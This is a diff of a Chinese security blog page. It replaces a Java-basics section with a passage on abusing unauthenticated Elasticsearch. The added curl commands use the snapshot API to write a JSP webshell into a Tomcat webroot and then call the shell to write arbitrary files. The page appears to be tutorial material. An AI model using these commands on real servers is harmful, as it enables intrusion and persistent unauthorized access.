-<h2 id="6、包机制"><a href="#6、包机制" class="headerlink" title="6、包机制"></a>6、包机制</h2><ul>
-<li>Java包机制，用于区别于类名的命名空间。</li>
-<li>包语句语法格式：</li>
-</ul>
-<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">pk1</span><span class="token punctuation">[</span><span class="token punctuation">.</span>pk2<span class="token punctuation">[</span><span class="token punctuation">.</span>pk3<span class="token punctuation">]</span><span class="token punctuation">]</span>				<span class="token comment">//定义包</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>‘</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 再创建一个恶意的存储库，其中`location`的值即为我要写入的路径：</span>
+<span class="token function">curl</span> -XPUT <span class="token string">'http://目的ip:9200/_snapshot/yz.jsp'</span> -d <span class="token string">'&#123;
+     "type": "fs",
+     "settings": &#123;
+          "location": "/usr/local/tomcat/webapps/wwwroot/",
+          "compress": false
+     &#125;
+&#125;'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-<ul>
-<li><strong>一般利用公司域名倒置作为包名</strong>：com.baidu.www</li>
-<li>使用<code>import</code>语句导入包，可使用该包的成员</li>
-</ul>
-<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token namespace">pk1</span><span class="token punctuation">[</span><span class="token punctuation">.</span>pk2<span class="token punctuation">[</span><span class="token punctuation">.</span>pk3<span class="token punctuation">]</span><span class="token punctuation">]</span>				<span class="token comment">//导入包</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<h2 id="7、JavaDoc生成文档"><a href="#7、JavaDoc生成文档" class="headerlink" title="7、JavaDoc生成文档"></a>7、JavaDoc生成文档</h2><ul>
-<li>javadoc命令用来生成自己的API文档</li>
-<li><strong>参数信息</strong><ul>
-<li>@author 作者名</li>
-<li>@version 版本号</li>
-<li>@since 指明需要最早使用的jdk版本</li>
-<li>@param 参数名</li>
-<li>@return 返回值情况</li>
-<li>@throws 异常抛出情况</li>
-</ul>
-</li>
-</ul>
-<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV12J41137hu">https://www.bilibili.com/video/BV12J41137hu</a></p>
+
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment">#存储库验证并创建：</span>
+<span class="token function">curl</span> -XPUT <span class="token string">"http://目的ip:9200/_snapshot/yz.jsp/yz.jsp"</span> -d <span class="token string">'&#123;
+    "indices": "yz.jsp",
+    "ignore_unavailable": "true",
+    "include_global_state": false
+&#125;'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>（3）访问<strong>8080</strong>端口<code>snapshot-yz.jsp</code>是我们写入的<code>webshell</code>。</p>
+<pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;目的ip:8080&#x2F;wwwroot&#x2F;indices&#x2F;yz.jsp&#x2F;snapshot-yz.jsp<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>（4）该shell的作用是向wwwroot下的test.jsp文件中写入任意字符串</p>
+<pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;目的ip:8080&#x2F;wwwroot&#x2F;indices&#x2F;yz.jsp&#x2F;snapshot-yz.jsp?f&#x3D;success
+
+访问http:&#x2F;&#x2F;目的ip:8080&#x2F;wwwroot&#x2F;test.jsp可看到success<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
 
                 
             </div>
@@ -752,7 +697,7 @@ b <span class="token operator">=</span> <span class="token number">8</span>
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="http://jaasenyi.github.io/2022/02/28/java-ji-chu/">http://jaasenyi.github.io/2022/02/28/java-ji-chu/</a>
+                    <a href="http://jaasenyi.github.io/2022/05/09/database-ser/">http://jaasenyi.github.io/2022/05/09/database-ser/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -790,8 +735,12 @@ b <span class="token operator">=</span> <span class="token number">8</span>
                     
                         <div class="article-tag">
                             
-                                <a href="/tags/Java/">
-                                    <span class="chip bg-color">Java</span>
+                                <a href="/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/">
+                                    <span class="chip bg-color">数据库</span>
+                                </a>
+                            
+                                <a href="/tags/%E6%9C%AA%E6%8E%88%E6%9D%83/">
+                                    <span class="chip bg-color">未授权</span>
                                 </a>
                             
                         </div>
@@ -1235,12 +1184,12 @@ b <span class="token operator">=</span> <span class="token number">8</span>
             <div class="article-badge left-badge text-color">
                 <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
             <div class="card">
-                <a href="/2022/03/02/java-liu-cheng-kong-zhi/">
+                <a href="/2022/05/09/java-anoandrel/">
                     <div class="card-image">
                         
-                        <img src="/medias/banner/java.jpeg" class="responsive-img" alt="Java流程控制(Part-2)">
+                        <img src="/medias/banner/AnoandRel.jpeg" class="responsive-img" alt="Java-注解与反射">
                         
-                        <span class="card-title">Java流程控制(Part-2)</span>
+                        <span class="card-title">Java-注解与反射</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -1251,7 +1200,7 @@ b <span class="token operator">=</span> <span class="token number">8</span>
                     </div>
                     <div class="publish-info">
                         <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2022-03-02
+                            <i class="far fa-clock fa-fw icon-date"></i>2022-05-09
                         </span>
                         <span class="publish-author">
                             
@@ -1283,12 +1232,12 @@ b <span class="token operator">=</span> <span class="token number">8</span>
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2022/02/22/wen-jian-shang-chuan-rao-guo/">
+                <a href="/2022/04/13/csrf-ssrf/">
                     <div class="card-image">
                         
-                        <img src="/medias/banner/upload.jpeg" class="responsive-img" alt="文件上传绕过">
+                        <img src="/medias/banner/csrf&ssrf.jpeg" class="responsive-img" alt="CSRF&amp;SSRF漏洞介绍">
                         
-                        <span class="card-title">文件上传绕过</span>
+                        <span class="card-title">CSRF&amp;SSRF漏洞介绍</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -1299,7 +1248,7 @@ b <span class="token operator">=</span> <span class="token number">8</span>
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2022-02-22
+                                <i class="far fa-clock fa-fw icon-date"></i>2022-04-13
                             </span>
                         <span class="publish-author">
                             
@@ -1318,10 +1267,6 @@ b <span class="token operator">=</span> <span class="token number">8</span>
                     
                     <a href="/tags/web%E5%AE%89%E5%85%A8/">
                         <span class="chip bg-color">web安全</span>
-                    </a>
-                    
-                    <a href="/tags/%E6%96%87%E4%BB%B6%E7%B1%BB%E5%9E%8B%E6%BC%8F%E6%B4%9E/">
-                        <span class="chip bg-color">文件类型漏洞</span>
                     </a>
                     
                 </div>
